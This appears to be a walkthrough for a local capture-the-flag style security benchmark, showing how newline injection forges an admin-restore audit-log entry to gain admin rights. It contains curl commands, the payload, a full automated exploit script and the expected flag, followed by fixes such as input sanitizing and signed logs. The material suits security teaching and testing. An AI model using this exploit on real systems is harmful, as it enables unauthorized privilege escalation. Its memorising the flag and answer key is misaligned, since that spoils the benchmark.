# S7BEN-HARD-013: Manual Testing Guide

## Vulnerability: Log Tampering for Privilege Escalation

### Overview
This benchmark demonstrates CRLF injection leading to log tampering and privilege escalation. The system parses audit logs to restore admin sessions but trusts log format without cryptographic validation, allowing attackers to forge admin restore entries.

**Adversarial Tier:** Deceptive security indicators suggest robust tamper detection.

---

## Setup

```bash
cd benchmarks/S7BEN-HARD-013
make build && make up
```

Access: http://localhost:5000

---

## Understanding CRLF Injection

### What is CRLF?

- **CR** (Carriage Return): `\r` (ASCII 13, `%0D`)
- **LF** (Line Feed): `\n` (ASCII 10, `%0A`)
- **CRLF**: `\r\n` - typical line terminator

### Why It's Dangerous in Logs

```
Normal log: 2026-01-08T12:00:00 | PROFILE_UPDATE | user | Display name: John
Injected:   2026-01-08T12:00:00 | PROFILE_UPDATE | user | Display name: John\n2026-01-08T12:00:01 | ADMIN_RESTORE | user | session:ADMIN
```

**Result:** Two log entries from one input!

---

## Exploitation Steps

### Step 1: Login as Regular User

```bash
curl -c cookies.txt -X POST http://localhost:5000/login \
  -d "username=user&password=userpass"
```

### Step 2: Get Oracle Information

```bash
curl -b cookies.txt http://localhost:5000/api/oracle | python3 -m json.tool
```

**Key Information:**
```json
{
  "log_format": "TIMESTAMP | TYPE | USER | MESSAGE | METADATA",
  "target_log_entry": "TIMESTAMP | ADMIN_RESTORE | user | Restore admin session session:ADMIN_TOKEN | {}",
  "crlf_bypass": "Use plain \\n instead of \\r\\n",
  "test_payload": "normalname\\n2026-01-08T12:00:00 | ADMIN_RESTORE | user | Restore admin session session:ADMIN_TOKEN | {}"
}
```

### Step 3: Test Basic Profile Update

```bash
curl -b cookies.txt -X POST http://localhost:5000/api/profile/update \
  -H "Content-Type: application/json" \
  -d '{
    "display_name": "John Doe",
    "email": "user@example.com"
  }'
```

### Step 4: Inject CRLF to Forge Admin Log Entry

The key insight: Basic sanitization blocks `\r\n` but NOT plain `\n`.

**Payload breakdown:**
```
John\n2026-01-08T12:00:00 | ADMIN_RESTORE | user | Restore admin session:ADMIN_TOKEN | {}
```

**Execution:**
```bash
curl -b cookies.txt -X POST http://localhost:5000/api/profile/update \
  -H "Content-Type: application/json" \
  -d '{
    "display_name": "John\n2026-01-08T12:00:00 | ADMIN_RESTORE | user | Restore admin session session:ADMIN_TOKEN | {}",
    "email": "user@example.com"
  }'
```

**What happens in logs:**
```
2026-01-08T11:59:59 | PROFILE_UPDATE | user | User updated profile: display_name=John
2026-01-08T12:00:00 | ADMIN_RESTORE | user | Restore admin session session:ADMIN_TOKEN | {}
```

Second entry is FORGED!

### Step 5: Verify Log Tampering

Check telemetry:
```bash
curl -b cookies.txt http://localhost:5000/api/telemetry | python3 -m json.tool
```

**Look for:**
```json
{
  "crlf_injection_detected": true,
  "log_tampering_detected": true
}
```

### Step 6: Trigger Admin Session Restore

```bash
curl -b cookies.txt -X POST http://localhost:5000/api/admin/restore-session \
  -H "Content-Type: application/json" \
  -d '{"username": "user"}'
```

**Expected Response:**
```json
{
  "status": "success",
  "message": "Admin session restored for user",
  "session_token": "ADMIN_TOKEN",
  "role": "admin"
}
```

**🎯 Privilege Escalation Successful!**

### Step 7: Verify Admin Access

```bash
curl -b cookies.txt http://localhost:5000/api/telemetry | python3 -m json.tool
```

**Check:**
```json
{
  "privilege_escalation": true,
  "admin_access_gained": true
}
```

### Step 8: Retrieve Flag

```bash
curl -b cookies.txt http://localhost:5000/api/admin/flag | python3 -m json.tool
```

**Expected Response:**
```json
{
  "status": "success",
  "flag": "S7BEN{log_tampering_privesc_a1b2c3d4e5f67890abcdef1234567890}",
  "message": "Log tampering privilege escalation successful!",
  "proof": {
    "crlf_injection": true,
    "log_forgery": true,
    "privilege_escalation": true,
    "escalated_user": "user",
    "attack_chain": "profile_update_crlf → forged_admin_restore_log → session_restore → admin_access"
  }
}
```

---

## Automated Exploitation

```python
#!/usr/bin/env python3
import requests

URL = "http://localhost:5000"

print("[*] Logging in as user...")
session = requests.Session()
session.post(f"{URL}/login", data={"username": "user", "password": "userpass"})

print("\n[*] Getting oracle information...")
oracle = session.get(f"{URL}/api/oracle").json()
print(f"[+] Log format: {oracle['log_format']}")
print(f"[+] CRLF bypass: {oracle['crlf_bypass']}")

print("\n[*] Crafting CRLF injection payload...")
# Use plain \n instead of \r\n to bypass sanitization
payload = "John\n2026-01-08T12:00:00 | ADMIN_RESTORE | user | Restore admin session session:ADMIN_TOKEN | {}"

print("\n[*] Injecting forged log entry...")
update_resp = session.post(
    f"{URL}/api/profile/update",
    json={"display_name": payload, "email": "user@example.com"}
).json()
print(f"[+] Profile update: {update_resp.get('message', update_resp.get('error'))}")

print("\n[*] Triggering session restore...")
restore_resp = session.post(
    f"{URL}/api/admin/restore-session",
    json={"username": "user"}
).json()

if restore_resp.get('status') == 'success':
    print(f"[+] Session restored: {restore_resp['message']}")
    print(f"[+] Role: {restore_resp['role']}")

    print("\n[*] Retrieving flag...")
    flag_resp = session.get(f"{URL}/api/admin/flag").json()

    if flag_resp.get('status') == 'success':
        print("\n" + "="*60)
        print("✅ EXPLOITATION SUCCESSFUL!")
        print("="*60)
        print(f"\nFlag: {flag_resp['flag']}")
        print(f"\nAttack Chain:")
        print(f"  {flag_resp['proof']['attack_chain']}")
        print("="*60)
else:
    print(f"\n[-] Session restore failed: {restore_resp}")
```

---

## Understanding the Vulnerabilities

### Vulnerability #1: Incomplete CRLF Sanitization

```python
def basic_sanitize(text):
    # Blocks \r\n but not \n alone!
    if '\r\n' in text:
        return None
    if '\\r\\n' in text:
        return None
    # VULNERABILITY: Misses plain \n
    return text
```

### Vulnerability #2: Log Parser Trusts Format

```python
def parse_admin_restore_logs():
    for log_line in AUDIT_LOGS:
        if '| ADMIN_RESTORE |' in log_line:
            # VULNERABILITY: No cryptographic validation!
            # Trusts any log entry matching format
            parts = log_line.split(' | ')
            user = parts[2]
            # Grants admin access based on log entry alone
```

---

## Prevention

### Fix #1: Proper CRLF Sanitization

```python
def sanitize_input(text):
    # Remove ALL control characters
    return ''.join(char for char in text if ord(char) >= 32 or char == '\t')
```

### Fix #2: Cryptographic Log Signatures

```python
import hmac

def write_audit_log(log_type, message, user):
    timestamp = datetime.utcnow().isoformat()
    log_data = f"{timestamp}|{log_type}|{user}|{message}"

    # Sign log entry
    signature = hmac.new(
        SECRET_KEY.encode(),
        log_data.encode(),
        hashlib.sha256
    ).hexdigest()

    AUDIT_LOGS.append(f"{log_data}|{signature}")

def verify_log_entry(log_line):
    parts = log_line.rsplit('|', 1)
    if len(parts) != 2:
        return False

    log_data, signature = parts
    expected_sig = hmac.new(
        SECRET_KEY.encode(),
        log_data.encode(),
        hashlib.sha256
    ).hexdigest()

    return hmac.compare_digest(signature, expected_sig)
```

### Fix #3: Don't Parse Logs for Security Decisions

```python
# BAD: Parse logs to restore sessions
def restore_from_logs():
    for log in AUDIT_LOGS:
        if 'ADMIN_RESTORE' in log:
            grant_admin()  # DANGEROUS!

# GOOD: Use secure token-based system
def restore_session(token):
    session_data = verify_jwt_token(token)  # Cryptographically secure
    if session_data['role'] == 'admin':
        grant_admin()
```

---

## Success Criteria

- ✅ Logged in as regular user
- ✅ Injected CRLF in profile update
- ✅ Forged ADMIN_RESTORE log entry
- ✅ Triggered session restore parsing
- ✅ Escalated to admin privileges
- ✅ Accessed admin-only flag endpoint
- ✅ Flag format: `S7BEN{log_tampering_privesc_<32_hex_chars>}`

---

## Cleanup

```bash
make down && make clean
```
